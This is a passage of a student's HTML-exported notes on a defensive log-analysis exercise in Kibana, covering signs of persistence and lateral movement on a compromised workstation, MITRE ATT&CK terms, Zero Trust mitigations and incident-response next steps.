src="image%20324.png"/></a></figure><p id="1945b2cc-075b-802a-8ef4-f1fa6de82648" class="">beacon for sending signals ?</p><figure id="1945b2cc-075b-8033-9515-ddbaa5032903" class="image"><a href="image%20325.png"><img style="width:709.924560546875px" src="image%20325.png"/></a></figure><p id="1945b2cc-075b-806b-ae60-c46de9ad529d" class="">sheduled task for persisntnce</p><figure id="1945b2cc-075b-8022-bacb-f0cfc890b9d9" class="image"><a href="image%20326.png"><img style="width:709.9669799804688px" src="image%20326.png"/></a></figure><p id="1945b2cc-075b-8006-809d-cc54c960327b" class="">registry edited for persitnce</p><p id="1945b2cc-075b-80a6-aa69-fd90185cef22" class="">
</p><p id="1945b2cc-075b-806c-8bff-dc8fb76df512" class=""><mark class="highlight-blue"><strong>Lateral Movement</strong></mark></p><p id="1945b2cc-075b-801f-b4c6-febc3292e286" class="">In the context of MITRE ATT&amp;CK, &quot;<strong>Lateral Movement</strong>&quot; refers to the techniques and methods used by adversaries to pivot through multiple systems and accounts and explore the network to gain access to their target.</p><p id="1945b2cc-075b-8097-b4f2-db932dc37899" class="">
</p><p id="1945b2cc-075b-8049-8319-ea1b6dcdfa8b" class="">looks for signs of lateral movement</p><figure id="1945b2cc-075b-80dc-9338-e7711e286770" class="image"><a href="3D0ABB0B-DC0A-4C91-9902-32DC5A8D3472.png"><img style="width:709.9953002929688px" src="3D0ABB0B-DC0A-4C91-9902-32DC5A8D3472.png"/></a></figure><p id="1945b2cc-075b-80f4-8694-e39257f2e788" class=""><br/><br/>USER DID LOG IN </p><p id="1945b2cc-075b-8084-9074-efdf28384a19" class="">
</p><p id="1945b2cc-075b-80d8-a090-fc5d28df0de7" class="">MITIGRATION</p><p id="1945b2cc-075b-8081-aaa7-ce77843c270e" class="">
</p><p id="1945b2cc-075b-8067-93a7-e18c33cb8fdc" class="">There are several defence concepts around mitigating an attacker&#x27;s ability to move freely around the network, such as <strong>network segmentation</strong>, <strong>strict access controls</strong>, and <strong><a href="https://www.microsoft.com/en-ca/security/business/zero-trust">Zero Trust</a></strong><strong> principles</strong>. Traditional security models relied on the assumption that threats were external and that once inside the network, users and devices could be trusted. However, this approach has proven inadequate with increasing internal threats. &quot;Zero Trust&quot;, on the other hand, continuously authenticates and authorizes users, devices, and applications <strong>before granting access</strong> to resources.<br/><br/></p><h1 id="1945b2cc-075b-80c2-8bfc-f16875d7ef1f" class="">Conclusion</h1><p id="1945b2cc-075b-803b-a514-db8cc3e55d12" class="">To summarize our analysis, we identified several <strong>indicators of compromise</strong> on Bill&#x27;s workstation. We mapped several of these log events to common tactics and techniques conducted by threat actors. Through a comprehensive exploration of search and filter functions in Kibana, we successfully deciphered the actions performed by a malicious actor on the compromised system.</p><p id="1945b2cc-075b-8049-b88d-cf4e4028bc0b" class="">We gained practical insights into the attacker&#x27;s tactics and techniques and enhanced our understanding of <strong>real-world cyber security incident scenarios</strong>. This exercise highlighted the significance of log analysis and its role in detecting and mitigating security incidents, reinforcing the importance of continuous monitoring and analysis of log data to fortify our defences against malicious actors.</p><h1 id="1945b2cc-075b-80ff-9f95-d6e5051dbc8f" class="">Next Steps</h1><p id="1945b2cc-075b-8067-a717-fc14fc77ef79" class="">After completing the log analysis and gaining valuable insights into the actions of the malicious actor, it is essential to highlight that the analysis phase is just <strong>one component</strong> of the broader incident response process. Typically, the remaining incident response process involves <strong>additional crucial steps</strong> that are beyond the scope of this room but equally as important:</p><ul id="1945b2cc-075b-80dd-ae22-e22d850558d4" class="bulleted-list"><li style="list-style-type:disc"><strong>Containment</strong>: Isolating the affected system or network segment to prevent further damage.</li></ul><ul id="1945b2cc-075b-8055-823d-fe2e3f130c73" class="bulleted-list"><li style="list-style-type:disc"><strong>Eradication</strong>: Removing the malicious presence from the compromised system.</li></ul><ul id="1945b2cc-075b-8051-8485-cdfc55018df2" class="bulleted-list"><li style="list-style-type:disc"><strong>Recovery</strong>: Restoring the system or network to its normal functioning state.</li></ul><ul id="1945b2cc-075b-8015-9c53-f4c710e57ed1" class="bulleted-list"><li style="list-style-type:disc"><strong>Post-Incident Activity</strong>: Assessing the incident, identifying root causes, documenting lessons learned, and implementing security enhancements.</li></ul><p id="1945b2cc-075b-804a-85d9-d32fbf82b3d3" class="">The <a href="https://nvlpubs.nist.gov/nistpubs/specialpublications/nist.sp.800-61r2.pdf">Computer Security Incident Handling Guide</a> by NIST (National Institute of Standards and Technology) is a fantastic resource for in-depth guidelines and best practices for effectively responding to computer security incidents.</p><h1 id="1945b2cc-075b-809b-bd58-c2002f2ee2c8" class="">Further Research</h1><ul id="1945b2cc-075b-8015-98d0-f4b3def63508" class="bulleted-list"><li style="list-style-type:disc"><a href="https://www.elastic.co/elastic-stack/">elastic.co/elastic-stack</a>: The Elastic Stack&#x27;s official website.</li></ul><ul id="1945b2cc-075b-805e-836a-d2da9efb337d" class="bulleted-list"><li style="list-style-type:disc"><a href="https://www.elastic.co/guide/en/ecs/current/ecs-field-reference.html">ECS Field Reference</a>: ECS (Elastic Common Schema) field reference guide.</li></ul><ul id="1945b2cc-075b-80b1-8530-ff34076fcf26" class="bulleted-list"><li style="list-style-type:disc"><a href="https://attack.mitre.org/">attack.mitre.org</a>: The official website of the <strong>MITRE ATT&amp;CK</strong> framework.</li></ul></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>